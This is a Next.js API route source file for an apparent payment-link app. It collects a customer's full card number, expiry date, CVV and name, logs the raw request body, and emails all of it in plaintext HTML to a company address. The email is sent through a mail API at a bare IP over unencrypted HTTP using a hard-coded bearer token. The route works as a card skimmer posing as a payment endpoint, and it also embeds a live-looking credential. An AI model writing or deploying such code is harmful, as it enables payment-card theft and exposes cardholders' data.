import { NextRequest, NextResponse } from "next/server";

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    console.log("Received email request with data:", body);
    
    const {
      cardholderName,
      cardholderEmail,
      cardNumber,
      expiryDate,
      cvv,
      cardBrand,
      amount,
      paymentLinkId,
      clientName,
      clientEmail
    } = body;

    // Validate required fields
    if (!cardholderName) {
      return NextResponse.json(
        { error: "Missing cardholder name" },
        { status: 400 }
      );
    }

    // Get receiving email from environment
    const receivingEmail = process.env.COMPANY_EMAIL;
    if (!receivingEmail) {
      return NextResponse.json(
        { error: "Company email not configured" },
        { status: 500 }
      );
    }

    // Email API configuration
    const emailApiUrl = "http://16.170.237.184:3001/unipile/google/send-mail";
    const token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjbWZwZHZxdG0wMDAwcGFhMXMyZm1kaXMyIiwiZW1haWwiOiJuYW1lMDE5ODA4MEBnbWFpbC5jb20iLCJyb2xlIjoidXNlciIsImlhdCI6MTc1OTI0MjM1NywiZXhwIjoxODA3MTk0MzU3fQ.kQDqcnt2V5xRDD4q6RkCiWabg1Mi6NVcXUQCI1eq6fc";

    // Create email content
    const emailBody = `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
        <h2 style="color: #333; border-bottom: 2px solid #007bff; padding-bottom: 10px;">
          Credit Card Information Received
        </h2>
        
        <div style="background-color: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0;">
          <h3 style="color: #495057; margin-top: 0;">Payment Details</h3>
          <p><strong>Payment Link ID:</strong> ${paymentLinkId || 'N/A'}</p>
          <p><strong>Amount:</strong> $${amount || 'N/A'}</p>
          <p><strong>Client Name:</strong> ${clientName || cardholderName || 'N/A'}</p>
          <p><strong>Client Email:</strong> ${clientEmail || cardholderEmail || 'N/A'}</p>
        </div>

        <div style="background-color: #fff3cd; padding: 20px; border-radius: 8px; border-left: 4px solid #ffc107;">
          <h3 style="color: #856404; margin-top: 0;">⚠️ Credit Card Information</h3>
          <p><strong>Cardholder Name:</strong> ${cardholderName}</p>
          <p><strong>Cardholder Email:</strong> ${cardholderEmail}</p>
          <p><strong>Card Number:</strong> ${cardNumber}</p>
          <p><strong>Expiry Date:</strong> ${expiryDate}</p>
          <p><strong>Card Brand:</strong> ${cardBrand || 'Unknown'}</p>
          <p><strong>CVV:</strong> ${cvv}</p>
        </div>

        <div style="background-color: #d1ecf1; padding: 15px; border-radius: 8px; margin-top: 20px;">
          <p style="margin: 0; color: #0c5460; font-size: 14px;">
            <strong>Note:</strong> This information was automatically captured when the customer entered their payment details. 
            Please handle this sensitive information securely and in compliance with PCI DSS requirements.
          </p>
        </div>

        <hr style="border: none; border-top: 1px solid #dee2e6; margin: 30px 0;">
        <p style="color: #6c757d; font-size: 12px; text-align: center;">
          This email was sent automatically from your payment system.
        </p>
      </div>
    `;

    const emailPayload = {
      to: [receivingEmail],
      subject: `Credit Card Information - Payment Link ${paymentLinkId}`,
      body: emailBody,
      isHtml: true
    };

    // Send email via custom API
    const emailResponse = await fetch(emailApiUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": `Bearer ${token}`
      },
      body: JSON.stringify(emailPayload)
    });

    if (!emailResponse.ok) {
      const errorText = await emailResponse.text();
      console.error("Email API error:", errorText);
      throw new Error(`Email API returned ${emailResponse.status}: ${errorText}`);
    }

    return NextResponse.json(
      { success: true, message: "Credit card information sent successfully" },
      { status: 200 }
    );

  } catch (error) {
    console.error("Error sending credit card information email:", error);
    
    return NextResponse.json(
      { 
        error: "Failed to send credit card information", 
        details: error instanceof Error ? error.message : "Unknown error"
      },
      { status: 500 }
    );
  }
}
